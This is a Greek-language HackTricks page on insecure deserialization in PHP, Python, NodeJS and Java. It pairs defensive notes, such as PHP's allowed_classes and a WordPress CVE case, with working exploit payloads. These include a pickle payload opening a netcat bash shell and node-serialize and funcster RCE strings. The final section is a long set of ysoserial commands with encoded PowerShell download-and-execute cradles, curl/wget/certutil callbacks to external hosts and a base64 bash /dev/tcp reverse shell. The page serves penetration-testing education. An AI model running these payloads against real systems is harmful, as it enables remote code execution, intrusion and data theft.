# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

**Serialization** νοείται ως η μέθοδος μετατροπής ενός αντικειμένου σε μια μορφή που μπορεί να διατηρηθεί, με σκοπό είτε την αποθήκευση του αντικειμένου είτε τη μετάδοσή του ως μέρος μιας διαδικασίας επικοινωνίας. Αυτή η τεχνική χρησιμοποιείται συνήθως για να εξασφαλιστεί ότι το αντικείμενο μπορεί να αναδημιουργηθεί αργότερα, διατηρώντας τη δομή και την κατάσταση του.

**Deserialization**, αντιθέτως, είναι η διαδικασία που αντιστρέφει τη serialization. Περιλαμβάνει τη λήψη δεδομένων που έχουν δομηθεί σε συγκεκριμένη μορφή και την ανακατασκευή τους πίσω σε αντικείμενο.

Η Deserialization μπορεί να είναι επικίνδυνη επειδή ενδέχεται να **επιτρέψει σε επιτιθέμενους να χειραγωγήσουν τα serialized δεδομένα για να εκτελέσουν κακόβουλο κώδικα** ή να προκαλέσουν απρόβλεπτη συμπεριφορά στην εφαρμογή κατά τη διαδικασία ανακατασκευής του αντικειμένου.

## PHP

Στο PHP, συγκεκριμένες μαγικές μέθοδοι χρησιμοποιούνται κατά τις διαδικασίες serialization και deserialization:

- `__sleep`: Επικαλείται όταν ένα αντικείμενο σειριοποιείται. Αυτή η μέθοδος πρέπει να επιστρέφει έναν πίνακα με τα ονόματα όλων των ιδιοτήτων του αντικειμένου που πρέπει να σειριοποιηθούν. Συνήθως χρησιμοποιείται για να δεσμεύσει εκκρεμή δεδομένα ή για εκτέλεση παρόμοιων εργασιών καθαρισμού.
- `__wakeup`: Καλείται όταν ένα αντικείμενο αποσειριοποιείται. Χρησιμοποιείται για να επαναφέρει τυχόν συνδέσεις με βάση δεδομένων που μπορεί να έχουν χαθεί κατά τη σειριοποίηση και για άλλες εργασίες επανεκκίνησης/επαναρχικοποίησης.
- `__unserialize`: Αυτή η μέθοδος καλείται αντί του `__wakeup` (αν υπάρχει) όταν ένα αντικείμενο αποσειριοποιείται. Παρέχει μεγαλύτερο έλεγχο στη διαδικασία αποσειριοποίησης σε σχέση με το `__wakeup`.
- `__destruct`: Αυτή η μέθοδος καλείται όταν ένα αντικείμενο πρόκειται να καταστραφεί ή όταν το script τερματίζει. Συνήθως χρησιμοποιείται για εργασίες καθαρισμού, όπως το κλείσιμο χειριστών αρχείων ή συνδέσεων με βάσεις δεδομένων.
- `__toString`: Αυτή η μέθοδος επιτρέπει σε ένα αντικείμενο να αντιμετωπίζεται ως string. Μπορεί να χρησιμοποιηθεί για την ανάγνωση αρχείων ή άλλες εργασίες που βασίζονται στις κλήσεις συναρτήσεων εντός της, παρέχοντας ουσιαστικά μια κειμενική αναπαράσταση του αντικειμένου.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Αν κοιτάξετε τα αποτελέσματα θα δείτε ότι οι συναρτήσεις **`__wakeup`** και **`__destruct`** καλούνται όταν το αντικείμενο απο-σειριοποιείται. Σημειώστε ότι σε αρκετούς οδηγούς θα βρείτε ότι η συνάρτηση **`__toString`** καλείται όταν προσπαθεί να εκτυπώσει κάποιο attribute, αλλά προφανώς αυτό **δεν συμβαίνει πια**.

> [!WARNING]
> Η μέθοδος **`__unserialize(array $data)`** καλείται **αντί για `__wakeup()`** αν είναι υλοποιημένη στην κλάση. Σας επιτρέπει να απο-σειριοποιήσετε το αντικείμενο παρέχοντας τα serialized δεδομένα ως array. Μπορείτε να χρησιμοποιήσετε αυτή τη μέθοδο για να απο-σειριοποιήσετε ιδιότητες και να εκτελέσετε οποιεσδήποτε απαραίτητες εργασίες κατά την απο-σειριοποίηση.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Μπορείτε να διαβάσετε ένα εξηγημένο παράδειγμα **PHP εδώ**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), εδώ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ή εδώ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Μπορείτε να καταχραστείτε τη λειτουργικότητα autoload του PHP για να φορτώσετε αυθαίρετα αρχεία php και άλλα:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Σειριοποίηση Αναφερόμενων Τιμών

Αν για κάποιο λόγο θέλετε να σειριοποιήσετε μια τιμή ως **αναφορά σε άλλη σειριοποιημένη τιμή**, μπορείτε:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Αποτροπή του PHP Object Injection με `allowed_classes`

> [!INFO]
> Η υποστήριξη για το **δεύτερο όρισμα** της `unserialize()` (ο πίνακας `$options`) προστέθηκε στο **PHP 7.0**. Σε παλαιότερες εκδόσεις η συνάρτηση δέχεται μόνο τη σειριακή συμβολοσειρά, καθιστώντας αδύνατο να περιοριστεί ποιες κλάσεις μπορούν να δημιουργηθούν.

`unserialize()` θα **δημιουργήσει αντικείμενο για κάθε κλάση** που βρίσκει μέσα στη σειριακή ροή εκτός αν υποδειχθεί διαφορετικά. Από το PHP 7 η συμπεριφορά μπορεί να περιοριστεί με την επιλογή [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php):
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Αν **`allowed_classes` παραληφθεί _ή_ ο κώδικας εκτελείται σε PHP < 7.0**, η κλήση γίνεται **επικίνδυνη**, καθώς ένας επιτιθέμενος μπορεί να δημιουργήσει ένα payload που εκμεταλλεύεται τις μαγικές μεθόδους όπως `__wakeup()` ή `__destruct()` για να επιτύχει Remote Code Execution (RCE).

#### Πραγματικό παράδειγμα: Everest Forms (WordPress) CVE-2025-52709

Το WordPress plugin **Everest Forms ≤ 3.2.2** προσπάθησε να είναι αμυντικό με ένα βοηθητικό wrapper αλλά ξέχασε τις παλαιότερες εκδόσεις PHP:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
Σε διακομιστές που ακόμα έτρεχαν **PHP ≤ 7.0** αυτό το δεύτερο branch οδηγούσε σε κλασικό **PHP Object Injection** όταν ένας διαχειριστής άνοιγε μια κακόβουλη υποβολή φόρμας. Ένα ελάχιστο exploit payload θα μπορούσε να μοιάζει ως εξής:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Μόλις ο admin είδε την εγγραφή, το αντικείμενο δημιουργήθηκε και `SomeClass::__destruct()` εκτελέστηκε, οδηγώντας σε arbitrary code execution.

**Συμπεράσματα**
1. Πάντα περάστε `['allowed_classes' => false]` (or a strict white-list) όταν καλείτε `unserialize()`.
2. Ελέγξτε τους defensive wrappers – συχνά ξεχνούν τα legacy PHP branches.
3. Η αναβάθμιση σε **PHP ≥ 7.x** από μόνη της *δεν* είναι επαρκής: η επιλογή πρέπει να παρέχεται ρητά.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) μπορεί να σας βοηθήσει να δημιουργήσετε payloads για να καταχραστείτε PHP deserializations.\
Σημειώστε ότι σε αρκετές περιπτώσεις **δεν θα μπορέσετε να βρείτε τρόπο να καταχραστείτε μια deserialization στον πηγαίο κώδικα** της εφαρμογής, αλλά ίσως να μπορείτε να **εκμεταλλευτείτε τον κώδικα εξωτερικών PHP extensions.**\
Οπότε, αν μπορείτε, ελέγξτε το `phpinfo()` του server και **αναζητήστε στο διαδίκτυο** (ακόμα και στα **gadgets** του **PHPGGC**) κάποιο πιθανό gadget που θα μπορούσατε να εκμεταλλευτείτε.

### phar:// metadata deserialization

Αν έχετε βρει ένα LFI που απλώς διαβάζει το αρχείο και δεν εκτελεί τον php κώδικα μέσα σε αυτό, για παράδειγμα χρησιμοποιώντας συναρτήσεις όπως _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**.** Μπορείτε να προσπαθήσετε να καταχραστείτε μια **deserialization** που συμβαίνει κατά την **ανάγνωση** ενός **file** χρησιμοποιώντας το **phar** protocol.\
Για περισσότερες πληροφορίες διαβάστε την ακόλουθη ανάρτηση:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

When the object gets unpickle, the function \_\_\_reduce\_\_\_ will be executed.\
When exploited, server could return an error.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Πριν ελέγξετε την τεχνική bypass, δοκιμάστε να χρησιμοποιήσετε `print(base64.b64encode(pickle.dumps(P(),2)))` για να δημιουργήσετε ένα αντικείμενο συμβατό με python2 αν τρέχετε python3.

Για περισσότερες πληροφορίες σχετικά με τη διαφυγή από **pickle jails** δείτε:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

Η παρακάτω σελίδα παρουσιάζει την τεχνική για την εκμετάλλευση μιας unsafe deserialization στις βιβλιοθήκες python για yamls και ολοκληρώνεται με ένα εργαλείο που μπορεί να χρησιμοποιηθεί για τη δημιουργία RCE deserialization payload για **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **doesn't have "magic" functions** like PHP or Python that are going to be executed just for creating an object. But it has some **functions** that are **frequently used even without directly calling them** such as **`toString`**, **`valueOf`**, **`toJSON`**.\
Αν εκμεταλλευτείτε μια deserialization μπορείτε να **συμβιβάσετε αυτές τις functions για να εκτελέσουν άλλο κώδικα** (potentially abusing prototype pollutions) και έτσι να εκτελέσετε arbitrary code όταν κληθούν.

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _Ακολουθήστε_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _για περισσότερες πληροφορίες._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Αν θέλεις να μάθεις σχετικά με αυτή την τεχνική, **ρίξε μια ματιά στον ακόλουθο οδηγό**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Αυτή η βιβλιοθήκη επιτρέπει τη σειριοποίηση συναρτήσεων. Παράδειγμα:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
Το **σειριοποιημένο αντικείμενο** θα μοιάζει με:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Μπορείτε να δείτε στο παράδειγμα ότι όταν μια συνάρτηση σειριοποιείται η σημαία `_$$ND_FUNC$$_` προστίθεται στο σειριοποιημένο αντικείμενο.

Μέσα στο αρχείο `node-serialize/lib/serialize.js` μπορείτε να βρείτε την ίδια σημαία και πώς ο κώδικας τη χρησιμοποιεί.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Όπως φαίνεται στο τελευταίο κομμάτι του κώδικα, **αν η σημαία βρεθεί** χρησιμοποιείται το `eval` για να αποσειριοποιηθεί η συνάρτηση, οπότε βασικά **η είσοδος του χρήστη χρησιμοποιείται μέσα στο `eval`**.

Ωστόσο, **απλώς σειριοποιώντας** μια συνάρτηση **δεν θα την εκτελέσει**, καθώς θα ήταν απαραίτητο κάποια μεριά του κώδικα **να καλεί το `y.rce`** στο παράδειγμά μας και αυτό είναι πολύ **απίθανο**.\
Πάντως, μπορείτε απλά να **τροποποιήσετε το σειριοποιημένο αντικείμενο** **προσθέτοντας κάποιες παρενθέσεις** ώστε να εκτελεστεί αυτόματα η σειριοποιημένη συνάρτηση όταν το αντικείμενο απο-σειριοποιηθεί.\
Στο επόμενο κομμάτι κώδικα **παρατήρησε την τελευταία παρένθεση** και πώς η `unserialize` function θα εκτελέσει αυτόματα τον κώδικα:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Όπως αναφέρθηκε προηγουμένως, αυτή η βιβλιοθήκη θα πάρει τον κώδικα μετά το `_$$ND_FUNC$$_` και θα **τον εκτελέσει** χρησιμοποιώντας `eval`. Επομένως, για να **εκτελέσετε αυτόματα κώδικα** μπορείτε να **διαγράψετε το μέρος δημιουργίας της συνάρτησης** και την τελευταία παρένθεση και **απλά να εκτελέσετε ένα JS oneliner** όπως στο παρακάτω παράδειγμα:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
You can [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **περισσότερες πληροφορίες** σχετικά με το πώς να εκμεταλλευτείτε αυτήν την ευπάθεια.

### [funcster](https://www.npmjs.com/package/funcster)

Ένα αξιοσημείωτο χαρακτηριστικό του **funcster** είναι η μη προσβασιμότητα των **τυπικά ενσωματωμένων αντικειμένων**· αυτά βρίσκονται εκτός του προσβάσιμου scope. Αυτός ο περιορισμός αποτρέπει την εκτέλεση κώδικα που προσπαθεί να καλεί μεθόδους σε ενσωματωμένα αντικείμενα, οδηγώντας σε εξαιρέσεις όπως "ReferenceError: console is not defined" όταν εκτελούνται εντολές όπως `console.log()` ή `require(something)`.

Παρά αυτόν τον περιορισμό, η αποκατάσταση πλήρους πρόσβασης στο παγκόσμιο πλαίσιο, συμπεριλαμβανομένων όλων των τυπικά ενσωματωμένων αντικειμένων, είναι δυνατή μέσω μιας συγκεκριμένης προσέγγισης. Εκμεταλλευόμενος απευθείας το παγκόσμιο πλαίσιο, μπορεί κανείς να παρακάμψει αυτόν τον περιορισμό. Για παράδειγμα, η πρόσβαση μπορεί να αποκατασταθεί χρησιμοποιώντας το παρακάτω απόσπασμα:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Για**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Το πακέτο **serialize-javascript** έχει σχεδιαστεί αποκλειστικά για σκοπούς serialization, χωρίς ενσωματωμένες δυνατότητες deserialization. Οι χρήστες είναι υπεύθυνοι για την υλοποίηση της δικής τους μεθόδου για deserialization. Στο επίσημο παράδειγμα προτείνεται η άμεση χρήση του `eval` για το deserializing των serialized δεδομένων:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Αν αυτή η συνάρτηση χρησιμοποιείται για να deserialize αντικείμενα, μπορείς να την **εύκολα exploit**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Για**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

Στις παρακάτω σελίδες μπορείτε να βρείτε πληροφορίες για το πώς να καταχραστείτε αυτή τη βιβλιοθήκη για να εκτελέσετε αυθαίρετες εντολές:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

In Java, **deserialization callbacks are executed during the process of deserialization**. Αυτή η εκτέλεση μπορεί να εκμεταλλευτείται από attackers που κατασκευάζουν malicious payloads τα οποία ενεργοποιούν αυτά τα callbacks, οδηγώντας σε πιθανή εκτέλεση επιβλαβών ενεργειών.

### Fingerprints

#### White Box

Για να εντοπίσετε πιθανές serialization vulnerabilities στον κώδικα, αναζητήστε:

- Κλάσεις που υλοποιούν το `Serializable` interface.
- Χρήση των `java.io.ObjectInputStream`, `readObject`, `readUnshare` συναρτήσεων.

Δώστε επιπλέον προσοχή σε:

- `XMLDecoder` που χρησιμοποιείται με παραμέτρους ορισμένες από εξωτερικούς χρήστες.
- Η μέθοδος `fromXML` του `XStream`, ειδικά αν η έκδοση του XStream είναι μικρότερη ή ίση με 1.46, καθώς είναι ευάλωτη σε serialization issues.
- `ObjectInputStream` σε συνδυασμό με τη μέθοδο `readObject`.
- Υλοποίηση μεθόδων όπως `readObject`, `readObjectNodData`, `readResolve`, ή `readExternal`.
- `ObjectInputStream.readUnshared`.
- Γενική χρήση του `Serializable`.

#### Black Box

Για black box testing, ψάξτε για συγκεκριμένα **signatures or "Magic Bytes"** που υποδεικνύουν java serialized objects (που προέρχονται από `ObjectInputStream`):

- Hexadecimal pattern: `AC ED 00 05`.
- Base64 pattern: `rO0`.
- HTTP response headers with `Content-type` set to `application/x-java-serialized-object`.
- Hexadecimal pattern indicating prior compression: `1F 8B 08 00`.
- Base64 pattern indicating prior compression: `H4sIA`.
- Web files with the `.faces` extension and the `faces.ViewState` parameter. Η ανακάλυψη αυτών των προτύπων σε μια web εφαρμογή θα πρέπει να οδηγήσει σε εξέταση όπως αναλυτικά στο [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Έλεγχος ευπάθειας

Αν θέλετε να **learn about how does a Java Deserialized exploit work** θα πρέπει να ρίξετε μια ματιά σε [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), και [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization και pre-auth reachability

Σε σύγχρονες βάσεις κώδικα, μερικές φορές η deserialization τυλίγεται με `java.security.SignedObject` και επικυρώνεται μια υπογραφή πριν κληθεί το `getObject()` (το οποίο deserializes το εσωτερικό αντικείμενο). Αυτό αποτρέπει arbitrary top-level gadget classes αλλά μπορεί να είναι exploitable αν ένας attacker αποκτήσει μια έγκυρη υπογραφή (π.χ., private-key compromise ή ένα signing oracle). Επιπλέον, ροές error-handling μπορεί να δημιουργούν session-bound tokens για unauthenticated users, εκθέτοντας διαφορετικά προστατευμένα sinks pre-auth.

For a concrete case study with requests, IoCs, and hardening guidance, see:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

Μπορείτε να ελέγξετε αν έχει εγκατασταθεί κάποια εφαρμογή με γνωστές ευπάθειες.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Μπορείτε να προσπαθήσετε να **ελέγξετε όλες τις βιβλιοθήκες** που είναι γνωστό ότι είναι ευάλωτες και για τις οποίες [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Ή μπορείτε να ελέγξετε τις βιβλιοθήκες που αναφέρονται στο [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Μπορείτε επίσης να χρησιμοποιήσετε [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) για να αναζητήσετε πιθανούς gadget chains που μπορούν να εκμεταλλευτούν.\
Όταν τρέχετε το **gadgetinspector** (μετά το build) μην ανησυχείτε για τις πολλές προειδοποιήσεις/σφάλματα που εμφανίζει και αφήστε το να ολοκληρώσει. Θα γράψει όλα τα ευρήματα στο _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Παρακαλώ σημειώστε ότι **gadgetinspector won't create an exploit and it may indicate false positives**.

#### Black Box Test

Χρησιμοποιώντας το extension του Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) μπορείτε να εντοπίσετε **ποιες βιβλιοθήκες είναι διαθέσιμες** (και ακόμη και τις εκδόσεις). Με αυτή την πληροφορία μπορεί να γίνει **πιο εύκολη η επιλογή ενός payload** για την εκμετάλλευση της ευπάθειας.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
Το GadgetProbe επικεντρώνεται στις **`ObjectInputStream` deserializations**.

Χρησιμοποιώντας το extension του Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) μπορείτε να **εντοπίσετε ευάλωτες βιβλιοθήκες** exploitable με ysoserial και να τις **exploit**.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Το Java Deserialization Scanner επικεντρώνεται στις **`ObjectInputStream`** deserializations.

Μπορείτε επίσης να χρησιμοποιήσετε [**Freddy**](https://github.com/nccgroup/freddy) για να **detect deserializations** ευπάθειες στο **Burp**. Αυτό το plugin θα εντοπίσει **όχι μόνο ευπάθειες σχετικές με `ObjectInputStream`** αλλά **επίσης** ευπάθειες από βιβλιοθήκες deserialization του **Json** και του **Yml**. Σε active mode, θα προσπαθήσει να τα επιβεβαιώσει χρησιμοποιώντας sleep ή DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Δεν είναι όλα σχετικά με το να ελέγχετε αν κάποια ευάλωτη βιβλιοθήκη χρησιμοποιείται από τον server. Μερικές φορές μπορεί να καταφέρετε να **αλλάξετε τα δεδομένα μέσα στο serialized αντικείμενο και να παρακάμψετε κάποιους ελέγχους** (ίσως να σας δώσει δικαιώματα admin μέσα σε ένα webapp).\
Αν βρείτε ένα java serialized object που αποστέλλεται σε μια web εφαρμογή, **μπορείτε να χρησιμοποιήσετε** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **για να εμφανίσετε σε πιο ανθρώπινη αναγνώσιμη μορφή το serialized αντικείμενο που αποστέλλεται**. Γνωρίζοντας ποια δεδομένα στέλνετε θα είναι πιο εύκολο να τα τροποποιήσετε και να παρακάμψετε κάποιους ελέγχους.

### **Exploit**

#### **ysoserial**

Το κύριο εργαλείο για την εκμετάλλευση Java deserializations είναι [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Μπορείτε επίσης να σκεφτείτε τη χρήση του [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) που θα σας επιτρέψει να εκτελέσετε σύνθετες εντολές (με pipes για παράδειγμα).\
Σημειώστε ότι αυτό το εργαλείο είναι **focused** στο να εκμεταλλεύεται **`ObjectInputStream`**.\
Θα πρότεινα να **ξεκινήσετε χρησιμοποιώντας το payload "URLDNS"** πριν από ένα RCE payload για να ελέγξετε αν το injection είναι δυνατό. Σε κάθε περίπτωση, σημειώστε ότι ίσως το payload "URLDNS" να μην λειτουργεί ενώ κάποιο άλλο RCE payload να λειτουργεί.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
